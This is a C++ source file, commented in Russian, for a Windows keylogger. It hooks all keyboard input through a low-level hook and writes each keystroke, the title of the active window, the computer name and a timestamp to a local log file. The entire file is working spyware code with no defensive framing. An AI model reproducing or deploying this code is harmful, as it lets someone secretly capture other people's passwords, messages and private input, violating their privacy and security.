#include "keylog.h"
#define SIZE 16
#define TIME 20

HHOOK hook;
HWND currWin =0;
std::ofstream klog;

void show(int key) // функция возвращает нажатую клавишу в читаемом виде 
{
	char title[100];
	if (currWin != GetForegroundWindow()) {
		currWin = GetForegroundWindow();
		GetWindowTextA(currWin, title, 100);
		klog << "\n[" + std::string(title) + +"]\n";

	}
	bool low  =!( (GetKeyState(VK_CAPITAL) & 0x0001) ^ ((GetKeyState(VK_LSHIFT) & 0x1000) |
							(GetKeyState(VK_RSHIFT) & 0x1000)) ); // страшное бинарное выражение просто GetState просит так рабоать с ним 
	if (key == VK_BACK) {  klog << "[BACSPACE]"; }										
	else if (key == VK_HOME) { klog << "[HOME]"; }
	else if (key == VK_END) { klog << "[END]"; }
	else if (key == VK_CAPITAL) { klog << "[CAPS]"; }
	else if (key == VK_LSHIFT || key == VK_RSHIFT) { klog << "[SHIFT]"; }
	else if (key == VK_RETURN) { klog << "[ENTER]"; }
	else { 
		if (low) {
			klog << char(tolower(MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, 0)));
		}
		else {  klog << char(MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, 0)); }
	}
}


LRESULT __stdcall HookKeys(int nCode, WPARAM wParam, LPARAM lParam) // колбэк, когда хукаем нажатие
{
	KBDLLHOOKSTRUCT mykey;
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN) // проверям была ли нажата клавиша
		{
			mykey = *((KBDLLHOOKSTRUCT*)(lParam));
 			show(mykey.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam ); // устанавливаем хук снова
}


void writedate(time_t &start)
{
	char datet[32];
	std::tm* date = new std::tm;
	localtime_s(date, &start);
	strftime(datet, sizeof(datet), "[%m-%d-%Y %X]", date);
	klog << datet;
	delete date;
}

int getkeys(time_t &start)
{
	klog.open("keylog.txt", std::ios_base::app );
	klog << "START\n";
	std::streampos pos = klog.tellp();
	char compname[256];
	DWORD size = 256;
	//записываем имя компьютера 
	GetComputerNameA(compname, &size);
	klog << "["<< compname <<"]\n";
	//записываем время записи
	writedate(start);
	time_t end;
	time(&end);
	MSG msg;
	//устанавливаем хук
	hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookKeys, 0, 0);
	while (end-start <= TIME)
	{
		MsgWaitForMultipleObjects(0, NULL, FALSE, 1000, QS_ALLINPUT);
		if(PeekMessageA(&msg, NULL, 0, 0, 2)) std::cout << 1;
		std::time(&end);
	}
	UnhookWindowsHookEx(hook);
	klog << "\n";
	klog.close();
	currWin = 0;
	return pos;
}



